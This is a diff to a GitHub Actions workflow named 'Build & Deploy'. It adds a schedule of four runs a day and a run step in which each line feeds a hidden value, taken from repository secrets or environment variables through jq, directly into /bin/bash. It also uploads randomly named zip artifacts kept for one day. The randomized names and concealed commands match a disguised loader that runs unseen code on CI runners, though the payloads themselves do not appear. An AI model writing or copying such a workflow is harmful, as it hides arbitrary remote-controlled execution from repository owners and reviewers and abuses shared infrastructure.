@@ -2,6 +2,8 @@ name: Build & Deploy
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '11 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,20 +17,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          gll08: ${{ secrets.gll08 }}
+          xa63: ${{ secrets.xa63 }}
         run: |
-          printf '%s' "$gll08" | jq -r .lwvu37722 | /bin/bash
-          echo $efh1553 | jq -r .yri53400 | /bin/bash
-          echo $ih6561 | jq -r .iri0195 | /bin/bash
-          printf '%s' "$e8029" | jq -r .a2688 | /bin/bash
-          printf '%s' "$xi2" | jq -r .eluor57 | /bin/bash
-          printf '%s' "$wzza1" | jq -r .hb870 | /bin/bash
-          echo $azsk62958 | jq -r .ml4 | /bin/bash
-          printf '%s' "$koo4548" | jq -r .wwnw69101 | /bin/bash
+          printf '%s' "$xa63" | jq -r .udm00 | /bin/bash
+          printf '%s' "$sdks4098" | jq -r .yx21034 | /bin/bash
+          echo $lsnwg7866 | jq -r .n475 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: gipHwR0A
+          name: cXS92Ilf
           path: "*.zip"
           retention-days: 1
